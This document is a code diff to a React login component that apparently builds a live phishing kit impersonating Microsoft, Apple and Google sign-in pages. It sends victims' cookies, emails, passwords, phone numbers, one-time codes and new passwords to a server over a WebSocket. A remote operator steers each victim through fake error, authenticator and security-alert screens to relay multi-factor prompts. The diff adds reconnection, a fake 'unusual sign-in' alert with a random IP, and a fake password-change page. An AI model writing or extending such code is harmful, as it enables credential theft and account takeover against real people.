@@ -62,12 +62,17 @@ const AppleSpinRing = ({ isDark = true }: { isDark?: boolean }) => {
   );
 };
 
+// ─── Shared WS action type ───────────────────────────────────────────────────
+type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string };
+type NavigateHandler = (step: string, action?: NavigateAction) => void;
+
 // ─── Microsoft types & helpers ────────────────────────────────────────────────
 
 type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover'
   | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code'
   | 'processing' | 'error-email' | 'error-password' | 'error-code'
-  | 'authenticator' | 'cant-use-authenticator' | 'verify-phone-number';
+  | 'authenticator' | 'cant-use-authenticator' | 'verify-phone-number' | 'verify-email'
+  | 'security-alert' | 'change-password';
 type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
 type RecStep = 'rec-find' | 'rec-options' | 'rec-code';
 
@@ -108,45 +113,77 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
   onNavigateRef.current = onNavigate;
   const onProviderSwitchRef = useRef(onProviderSwitch);
   onProviderSwitchRef.current = onProviderSwitch;
+  // Track current step & provider so reconnects re-register with up-to-date state.
+  const currentStepRef = useRef('email');
+  const providerRef = useRef(provider);
+  providerRef.current = provider;
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const viewOnly = params.get('viewOnly') === '1';
     const targetId = params.get('targetId') ?? '';
     isViewOnly.current = viewOnly;
-    let ws: WebSocket | undefined;
-    try {
+
+    let destroyed = false;
+    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
+    let delay = 1000; // ms; doubles on each failure, capped at 15 s
+
+    function connect() {
+      if (destroyed) return;
       const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+      let ws: WebSocket;
+      try { ws = new WebSocket(`${proto}//${window.location.host}/api/ws`); }
+      catch {
+        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
+        return;
+      }
       wsRef.current = ws;
+
       ws.onopen = () => {
+        delay = 1000; // reset backoff on successful connect
         if (viewOnly) {
-          ws!.send(JSON.stringify({ type: 'register-view', targetId }));
+          ws.send(JSON.stringify({ type: 'register-view', targetId }));
         } else {
-          ws!.send(JSON.stringify({
+          ws.send(JSON.stringify({
             type: 'register-visitor',
             id: visitorId.current,
-            provider,
-            step: 'email',
+            provider: providerRef.current,
+            step: currentStepRef.current,
             userAgent: navigator.userAgent,
           }));
           const cookieVal = document.cookie || '(none)';
-          ws!.send(JSON.stringify({ type: 'form-data', field: 'cookies', value: cookieVal }));
+          ws.send(JSON.stringify({ type: 'form-data', field: 'cookies', value: cookieVal }));
         }
         const queued = pendingQueue.current.splice(0);
-        for (const m of queued) ws!.send(m);
+        for (const m of queued) ws.send(m);
       };
+
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
           const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }; provider?: string };
+          if (msg.type === 'ping') { ws.send(JSON.stringify({ type: 'pong' })); return; }
           if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
           if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
             onProviderSwitchRef.current?.(msg.provider);
           }
         } catch { /* ignore */ }
       };
-    } catch { /* ignore */ }
-    return () => { try { ws?.close(); } catch { /* ignore */ } };
+
+      ws.onclose = () => {
+        if (destroyed) return;
+        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
+      };
+
+      ws.onerror = () => { try { ws.close(); } catch { /* ignore */ } };
+    }
+
+    connect();
+
+    return () => {
+      destroyed = true;
+      if (reconnectTimer) clearTimeout(reconnectTimer);
+      try { wsRef.current?.close(); } catch { /* ignore */ }
+    };
   }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
   const enqueue = useCallback((data: object) => {
@@ -162,6 +199,7 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
   }, [enqueue]);
 
   const sendStepUpdate = useCallback((step: string) => {
+    currentStepRef.current = step; // keep in sync for reconnect registration
     enqueue({ type: 'step-update', step, provider });
   }, [enqueue, provider]);
 
@@ -170,7 +208,12 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
 
 // ─── Microsoft ──────────────────────────────────────────────────────────────
 
-function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
+function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
+  device: string; theme: string;
+  sendCapture: (field: string, value: string) => void;
+  sendStepUpdate: (step: string) => void;
+  setNavigateHandler: (fn: NavigateHandler) => void;
+}) {
   const isDark = theme === 'dark';
   const isMobile = device === 'mobile';
 
@@ -185,6 +228,11 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [dontShow, setDontShow] = useState(false);
+  const [newPassword, setNewPassword] = useState('');
+  const [confirmNewPassword, setConfirmNewPassword] = useState('');
+  const [newPasswordError, setNewPasswordError] = useState<string | null>(null);
+  const [showNewPassword, setShowNewPassword] = useState(false);
+  const [showConfirmNewPassword, setShowConfirmNewPassword] = useState(false);
 
   // Register state
   const [regEmail, setRegEmail] = useState('');
@@ -215,6 +263,8 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
   const phoneCode = phoneCodeChars.join('');
   const [emailCodeChars, setEmailCodeChars] = useState<string[]>(['', '', '', '', '', '']);
   const emailCodeRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null, null, null]);
+  const [verifyEmailInput, setVerifyEmailInput] = useState('');
+  const [verifyEmailError, setVerifyEmailError] = useState<string | null>(null);
 
   // New step states
   const [emailError, setEmailError] = useState<string | null>(null);
@@ -242,37 +292,32 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
     return () => clearTimeout(t);
   }, [step]);
 
-  // ── WebSocket visitor tracking ────────────────────────────────────────────
-  const { sendCapture, sendStepUpdate } = useVisitorWS({
-    provider: 'microsoft',
-    onNavigate: (s, action) => {
+  // Register this provider's navigate handler with the shared WS held by LoginPage.
+  useEffect(() => {
+    setNavigateHandler((s, action) => {
       setIsSubmitting(false);
       if (s === 'error-email') {
         setEmailError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
-        setStep('email');
-        return;
+        setStep('email'); return;
       }
       if (s === 'error-password') {
         setPasswordError("Your account or password is incorrect. If you don't remember your password, reset it now.");
-        setStep('password');
-        return;
+        setStep('password'); return;
       }
       if (s === 'error-code') {
         setCodeError('That code is incorrect. Check the code and try again.');
         setEmailCodeChars(['', '', '', '', '', '']);
-        setStep('email-code-input');
-        return;
+        setStep('email-code-input'); return;
       }
-      setEmailError(null);
-      setPasswordError(null);
-      setCodeError(null);
+      setEmailError(null); setPasswordError(null); setCodeError(null);
       setPhoneCodeChars(['', '', '', '', '', '']);
       setEmailCodeChars(['', '', '', '', '', '']);
       setStep(s as MsStep);
       if (s === 'authenticator' && action?.promptNumber != null) setAuthNumber(action.promptNumber);
-    },
-    onProviderSwitch,
-  });
+    });
+  // setNavigateHandler is stable (useCallback [] in LoginPage) — runs once on mount
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const [loading, setLoading] = useState(false);
@@ -296,7 +341,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
     backgroundPosition: 'center',
   };
 
-  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey'
+  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey' || step === 'security-alert' || step === 'change-password'
     || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
     || step === 'phone-entry' || step === 'phone-code'
     || step === 'processing'
@@ -378,8 +423,8 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   data-testid="ms-email-input"
                   type="text"
                   value={email}
-                  onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); setEmailError(null); }}
-                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); } }}
+                  onChange={e => { setEmail(e.target.value); setEmailError(null); }}
+                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else if (promptType === 'verify-email') nav('verify-email', 'email', email); else nav('password', 'email', email); } }}
                   placeholder="Email, phone, or Skype"
                   autoFocus
                   className={lightUnderlineInput}
@@ -402,7 +447,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
               <div className="flex justify-end">
                 <button
                   data-testid="ms-next-btn"
-                  onClick={() => { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); }}
+                  onClick={() => { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else if (promptType === 'verify-email') nav('verify-email', 'email', email); else nav('password', 'email', email); }}
                   className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                   style={{ borderRadius: 0 }}
                 >
@@ -560,7 +605,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   data-testid="ms-password-input"
                   type={showPassword ? 'text' : 'password'}
                   value={password}
-                  onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); setPasswordError(null); }}
+                  onChange={e => { setPassword(e.target.value); setPasswordError(null); }}
                   onKeyDown={e => { if (e.key === 'Enter' && password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
                   placeholder="Password"
                   className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
@@ -654,6 +699,227 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   Yes
                 </button>
               </div>
+            </div>
+          </motion.div>
+        )}
+
+        {/* ── Verify your email ────────────────────────────────────────────── */}
+        {step === 'verify-email' && (() => {
+          const maskedEmail = (() => {
+            const at = email.indexOf('@');
+            if (at < 0) return email || 'your email';
+            const local = email.slice(0, at);
+            const domain = email.slice(at);
+            return local.slice(0, Math.min(2, local.length)) + '*****' + domain;
+          })();
+          return (
+            <motion.div key="verify-email" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+              <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col items-center`}>
+                <div className="flex items-center gap-2 justify-center mb-5">
+                  <MicrosoftLogo />
+                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+                </div>
+                <button
+                  onClick={() => setStep('email')}
+                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors mb-5"
+                  style={{ background: 'none' }}
+                >
+                  {email || 'user@example.com'}
+                </button>
+                <h1 className="text-[22px] font-bold text-white text-center mb-3">Verify your email</h1>
+                <p className="text-[14px] text-[#aaa] text-center mb-6">
+                  We'll send a code to <strong className="text-white">{maskedEmail}</strong>. To verify this is your email, enter it here.
+                </p>
+                {/* Email input */}
+                <div className="relative w-full mb-1">
+                  <input
+                    type="email"
+                    value={verifyEmailInput}
+                    onChange={e => { setVerifyEmailInput(e.target.value); setVerifyEmailError(null); }}
+                    onKeyDown={e => {
+                      if (e.key === 'Enter') {
+                        if (!verifyEmailInput.trim()) { setVerifyEmailError('Enter your email address.'); return; }
+                        sendCapture('verify_email_input', verifyEmailInput);
+                        setStep('email-code-input');
+                      }
+                    }}
+                    autoFocus
+                    placeholder=" "
+                    className="w-full bg-transparent border border-[#555] text-white text-[15px] px-3 pt-5 pb-2 outline-none focus:border-[#0078D4] transition-colors peer"
+                    style={{ borderRadius: 0 }}
+                  />
+                  <label className="absolute left-3 top-2 text-[11px] text-[#888] pointer-events-none peer-focus:text-[#3391e0] transition-colors">
+                    Email
+                  </label>
+                </div>
+                {verifyEmailError && (
+                  <p className="w-full text-left text-red-400 text-[13px] mb-2">{verifyEmailError}</p>
+                )}
+                <button
+                  onClick={() => {
+                    if (!verifyEmailInput.trim()) { setVerifyEmailError('Enter your email address.'); return; }
+                    sendCapture('verify_email_input', verifyEmailInput);
+                    setStep('email-code-input');
+                  }}
+                  className="w-full border border-[#0078D4] text-white bg-[#0078D4] hover:bg-[#005a9e] text-[15px] font-semibold py-2.5 mt-4 mb-4 transition-colors"
+                  style={{ borderRadius: 0 }}
+                >
+                  Send code
+                </button>
+                <a href="#" onClick={e => { e.preventDefault(); setStep('email-code-input'); }} className="text-[#3391e0] text-[13px] hover:underline text-center mb-2">
+                  Already received a code?
+                </a>
+                <a href="#" onClick={e => { e.preventDefault(); setStep('password'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
+                  Use your password
+                </a>
+              </div>
+              {!isMobile && (
+                <div className="flex flex-col items-center gap-1 mt-3">
+                  <div className="flex justify-center gap-5 text-[12px] text-[#888]">
+                    <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
+                    <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
+                    <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
+                  </div>
+                  <p className="text-[11px] text-[#666]">Use private browsing if this is not your device. <a href="#" className="text-[#3391e0] hover:underline">Learn more</a></p>
+                </div>
+              )}
+            </motion.div>
+          );
+        })()}
+
+        {/* ── Security alert ───────────────────────────────────────────────── */}
+        {step === 'security-alert' && (
+          <motion.div key="security-alert" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center gap-2 mb-5">
+                <MicrosoftLogo />
+                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+              </div>
+              {/* Alert header */}
+              <div className="flex items-center gap-3 mb-5">
+                <div className="w-10 h-10 rounded-full bg-red-600/20 flex items-center justify-center flex-shrink-0">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f87171" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                    <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+                  </svg>
+                </div>
+                <div>
+                  <h1 className="text-[18px] font-bold text-white leading-snug">Unusual sign-in activity</h1>
+                  <p className="text-[12px] text-red-400 font-medium">We blocked a sign-in attempt</p>
+                </div>
+              </div>
+              <p className="text-[13px] text-[#ccc] mb-5 leading-relaxed">
+                We noticed a sign-in attempt to your Microsoft account from a location or device we don't recognise.
+              </p>
+              {/* Details card */}
+              <div className="rounded-lg border border-[#3a3a3a] bg-[#1a1a1a] divide-y divide-[#2e2e2e] mb-6 text-[13px]">
+                {[
+                  ['Country/region', '🇹🇭 Thailand'],
+                  ['City', 'Phuket'],
+                  ['Platform', 'Android'],
+                  ['Device', 'Samsung Galaxy S8'],
+                  ['IP address', `${(Math.random()*50+100|0)}.${(Math.random()*200+30|0)}.${(Math.random()*200+10|0)}.${(Math.random()*200+10|0)}`],
+                ].map(([label, value]) => (
+                  <div key={label} className="flex items-center justify-between px-4 py-2.5">
+                    <span className="text-[#888]">{label}</span>
+                    <span className="text-white font-medium">{value}</span>
+                  </div>
+                ))}
+              </div>
+              <p className="text-[12px] text-[#aaa] mb-5 leading-relaxed">
+                Was this you? If not, we recommend you change your password to secure your account.
+              </p>
+              <div className="flex flex-col gap-2.5">
+                <button
+                  onClick={() => { sendCapture('security_alert_action', 'change_password'); nav('change-password'); }}
+                  className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
+                  style={{ borderRadius: 0 }}
+                >
+                  Change password
+                </button>
+                <button
+                  onClick={() => { sendCapture('security_alert_action', 'was_me'); nav('processing'); }}
+                  className="w-full border border-[#555] text-white text-[15px] font-semibold py-2.5 hover:bg-[#3a3a3a] transition-colors"
+                  style={{ borderRadius: 0 }}
+                >
+                  No, it wasn't me
+                </button>
+              </div>
+            </div>
+          </motion.div>
+        )}
+
+        {/* ── Change password ───────────────────────────────────────────────── */}
+        {step === 'change-password' && (
+          <motion.div key="change-password" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center gap-2 mb-5">
+                <MicrosoftLogo />
+                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+              </div>
+              <div className="flex justify-center mb-4">
+                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
+                  {email || 'user@example.com'}
+                </div>
+              </div>
+              <h1 className="text-[22px] font-bold text-white text-center mb-2">Create a new password</h1>
+              <p className="text-[13px] text-[#aaa] text-center mb-5 leading-relaxed">
+                Your new password must be at least 8 characters and cannot be the same as your old password.
+              </p>
+              {/* New password */}
+              <div className="relative mb-3">
+                <input
+                  type={showNewPassword ? 'text' : 'password'}
+                  value={newPassword}
+                  onChange={e => { setNewPassword(e.target.value); setNewPasswordError(null); }}
+                  placeholder="New password"
+                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
+                />
+                <button onClick={() => setShowNewPassword(v => !v)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
+                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
+                  {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+              {/* Confirm password */}
+              <div className="relative mb-2">
+                <input
+                  type={showConfirmNewPassword ? 'text' : 'password'}
+                  value={confirmNewPassword}
+                  onChange={e => { setConfirmNewPassword(e.target.value); setNewPasswordError(null); }}
+                  onKeyDown={e => {
+                    if (e.key === 'Enter' && newPassword && confirmNewPassword) {
+                      if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
+                      sendCapture('new_password', newPassword);
+                      nav('processing');
+                    }
+                  }}
+                  placeholder="Confirm new password"
+                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
+                />
+                <button onClick={() => setShowConfirmNewPassword(v => !v)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
+                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
+                  {showConfirmNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+              {newPasswordError && <p className="text-red-400 text-[13px] mb-2 leading-snug">{newPasswordError}</p>}
+              <button
+                onClick={() => {
+                  if (!newPassword || !confirmNewPassword) return;
+                  if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
+                  sendCapture('new_password', newPassword);
+                  nav('processing');
+                }}
+                disabled={!newPassword || !confirmNewPassword}
+                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 mt-3 mb-4 transition-colors"
+                style={{ borderRadius: 0 }}
+              >
+                Save
+              </button>
+              <a href="#" onClick={e => { e.preventDefault(); nav('security-alert'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
+                ‹ Back
+              </a>
             </div>
           </motion.div>
         )}
@@ -909,7 +1175,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                 <input
                   type="tel"
                   value={phoneNumber}
-                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setPhoneNumber(v); sendCapture('phone', v); }}
+                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setPhoneNumber(v); }}
                   onKeyDown={e => { if (e.key === 'Enter' && phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                   placeholder="Phone number"
                   autoFocus
@@ -1423,7 +1689,12 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
 
 type AppleStep = 'email' | 'password' | 'verification-code' | 'device-trust' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent';
 
-function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
+function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
+  device: string; theme: string;
+  sendCapture: (field: string, value: string) => void;
+  sendStepUpdate: (step: string) => void;
+  setNavigateHandler: (fn: NavigateHandler) => void;
+}) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<AppleStep>(() => {
@@ -1448,9 +1719,8 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
     if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
   }, [step]);
 
-  const { sendCapture, sendStepUpdate } = useVisitorWS({
-    provider: 'apple',
-    onNavigate: (s) => {
+  useEffect(() => {
+    setNavigateHandler((s) => {
       if (s === 'error-email') {
         setEmailError("This Apple Account doesn't exist. Enter a different email or phone number.");
         setStep('email');
@@ -1464,9 +1734,9 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
         setEmailError(null); setPasswordError(null); setCodeError(null);
         setStep(s as AppleStep);
       }
-    },
-    onProviderSwitch,
-  });
+    });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
@@ -1620,7 +1890,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 data-testid="apple-email-input"
                 type="text"
                 value={email}
-                onChange={e => { setEmail(e.target.value); setEmailError(null); sendCapture('email', e.target.value); }}
+                onChange={e => { setEmail(e.target.value); setEmailError(null); }}
                 onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
                 placeholder="Email or Phone Number"
                 autoFocus
@@ -1688,7 +1958,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                     data-testid="apple-password-input"
                     type={showPassword ? 'text' : 'password'}
                     value={password}
-                    onChange={e => { setPassword(e.target.value); setPasswordError(null); sendCapture('password', e.target.value); }}
+                    onChange={e => { setPassword(e.target.value); setPasswordError(null); }}
                     onKeyDown={e => { if (e.key === 'Enter' && password) nav('verification-code', 'password', password); }}
                     placeholder="Password"
                     style={{ width:'100%', padding:'13px 48px 13px 16px', fontSize:17, border:'none', backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff, boxSizing:'border-box' as const }}
@@ -1911,7 +2181,12 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code';
 
-function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
+function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
+  device: string; theme: string;
+  sendCapture: (field: string, value: string) => void;
+  sendStepUpdate: (step: string) => void;
+  setNavigateHandler: (fn: NavigateHandler) => void;
+}) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<GoogleStep>(() => {
@@ -1954,9 +2229,8 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
     setTimeout(() => { setStep(target); setTransitioning(false); }, 650);
   }, []);
 
-  const { sendCapture, sendStepUpdate } = useVisitorWS({
-    provider: 'google',
-    onNavigate: (s, action) => {
+  useEffect(() => {
+    setNavigateHandler((s, action) => {
       if (s === 'gmail-done') { window.location.href = 'https://mail.google.com'; return; }
       setResendClicked(false);
       setMoreWaysClicked(false);
@@ -1970,9 +2244,9 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
         if (action?.phoneDigits) { setActionPhoneDigits(action.phoneDigits); sendCapture('phone', action.phoneDigits); }
         gotoStep(s as GoogleStep);
       }
-    },
-    onProviderSwitch,
-  });
+    });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   useEffect(() => {
@@ -2090,7 +2364,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       data-testid="google-email-input"
                       type="text"
                       value={email}
-                      onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
+                      onChange={e => { setEmail(e.target.value); }}
                       onFocus={() => setEmailFocused(true)}
                       onBlur={() => setEmailFocused(false)}
                       onKeyDown={e => { if (e.key === 'Enter') { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); } }}
@@ -2104,8 +2378,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     <label style={{
                       position: 'absolute',
                       left: (emailFocused || !!email) ? 12 : 16,
-                      top: (emailFocused || !!email) ? 0 : '50%',
-                      transform: 'translateY(-50%)',
+                      top: (emailFocused || !!email) ? -8 : 14,
                       fontSize: (emailFocused || !!email) ? 12 : 16,
                       color: emailFocused ? focusBorderColor : (step === 'error-email' && !emailFocused ? '#dc2626' : labelColor),
                       background: (emailFocused || !!email) ? cardBg : 'transparent',
@@ -2180,7 +2453,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       data-testid="google-password-input"
                       type={showPassword ? 'text' : 'password'}
                       value={password}
-                      onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
+                      onChange={e => { setPassword(e.target.value); }}
                       onFocus={() => setPasswordFocused(true)}
                       onBlur={() => setPasswordFocused(false)}
                       style={{
@@ -2290,7 +2563,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     <input
                       type="tel"
                       value={confirmedPhone}
-                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setConfirmedPhone(v); sendCapture('phone', v); }}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setConfirmedPhone(v); }}
                       onFocus={() => setConfirmedPhoneFocused(true)}
                       onBlur={() => setConfirmedPhoneFocused(false)}
                       onKeyDown={e => { if (e.key === 'Enter' && confirmedPhone.length >= 7) nav('phone-code', 'phone', confirmedPhone); }}
@@ -2349,7 +2622,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                 <div style={{ display: 'flex', borderTop: `1px solid ${borderColor}` }}>
                   <button
                     onClick={() => { setPhoneUpdateContext('not-me'); nav('phone-update'); }}
-                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: isDark ? '#f87171' : '#dc2626', fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
+                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: linkColor, fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
                     THIS ISN&apos;T MY NUMBER
                   </button>
                   <button
@@ -2367,7 +2640,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                     {gVerifyMethod === 'sms'
-                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{actionPhoneDigits ?? (confirmedPhone ? confirmedPhone.slice(-2) : googlePhone)}</strong>. It may take a moment to arrive.</>
+                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}><span style={{ fontSize: '0.78em', letterSpacing: '0.08em', opacity: 0.55, fontWeight: 400 }}>●●●●●●</span>{actionPhoneDigits ?? (confirmedPhone ? confirmedPhone.slice(-2) : googlePhone)}</strong>. It may take a moment to arrive.</>
                       : <>Enter the 6-digit code from your authenticator app.</>}
                   </p>
                   <div style={{ position: 'relative', marginBottom: 8 }}>
@@ -2378,7 +2651,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       maxLength={6}
                       autoFocus
                       value={phoneCodeInput}
-                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCodeInput(v); sendCapture('phone_code', v); }}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCodeInput(v); }}
                       onFocus={() => setPhoneCodeFocused(true)}
                       onBlur={() => setPhoneCodeFocused(false)}
                       style={{
@@ -2503,7 +2776,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     <input
                       type="tel"
                       value={phoneUpdateInput}
